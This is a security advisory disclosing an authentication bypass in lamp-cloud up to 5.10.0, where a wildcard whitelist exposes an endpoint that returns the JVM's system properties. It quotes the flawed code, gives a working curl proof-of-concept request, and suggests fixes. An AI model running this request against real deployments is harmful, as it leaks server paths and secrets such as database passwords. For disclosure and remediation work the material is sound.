https://github.com/dromara/lamp-cloud

## Finding: Unauthenticated JVM system-properties disclosure via `/*/anno/**` whitelist — lamp-cloud ≤ 5.10.0

## Details:

There's a security vulnerability in lamp-cloud (dromara/lamp-cloud) affecting version 5.10.0 and earlier.

**Summary**

The global path whitelist in `IgnoreProperties.baseUri` includes the Spring PathPattern `/*/anno/**`. This pattern is used by both the gateway authentication filter (`AuthenticationSaInterceptor`) and the mono-server interceptor to decide whether to skip the login check. The code-generator controller (`DefGenProjectController`) is mapped to `/defGenProject`, and it exposes the endpoint `POST /defGenProject/anno/getProperties`, whose full path matches `/*/anno/**`. Consequently, any unauthenticated caller can retrieve the server's full JVM system-properties map.

**Affected versions**: ≤ 5.10.0 (branch `java17/5.x`)

**Root cause**

`lamp-public/lamp-common/src/main/java/top/tangyh/lamp/common/properties/IgnoreProperties.java`:

```java
private Map<String, Set<String>> baseUri = MapUtil.<String, Set<String>>builder(HttpMethod.ALL.name(), CollUtil.newHashSet(
    ...
    "/*/anno/**",   // matches /defGenProject/anno/getProperties
    ...
)).build();
```

`lamp-generator/lamp-generator-controller/.../DefGenProjectController.java`:

```java
@RestController
@RequestMapping("/defGenProject")
public class DefGenProjectController {
    @PostMapping("/anno/getProperties")
    public R<Object> getProperties() {
        return R.success(System.getProperties()); // unauthenticated disclosure
    }
}
```

**Impact**

An unauthenticated attacker obtains the full JVM system-properties map including: server filesystem paths (`user.home`, `user.dir`, `java.home`), the full class path, OS fingerprint, and any sensitive values passed as `-D` JVM arguments at startup (e.g. database passwords).

**PoC**

```bash
curl -s -X POST http://HOST:PORT/defGenProject/anno/getProperties \
     -H "Content-Type: application/json"
# Returns {"code":0,"data":{"java.home":"/usr/lib/jvm/...","user.home":"/home/...","user.dir":"..."},...}
```

Path-match proof (Spring PathPattern, no server required):

```java
boolean bypass = PathPatternParser.defaultInstance
    .parse("/*/anno/**")
    .matches(PathContainer.parsePath("/defGenProject/anno/getProperties"));
System.out.println(bypass); // true — login check is skipped
```

**Remediation**

1. Remove the `getProperties` endpoint (`DefGenProjectController.getProperties()`) — it has no legitimate runtime purpose.
2. Replace the wildcard `/*/anno/**` in `IgnoreProperties.baseUri` with explicit paths, so unintended controllers cannot fall into the anonymous whitelist.

## Disclosure

 - 17 June 2026 - reported via email
 - 14 September 2026 - no response, disclosed
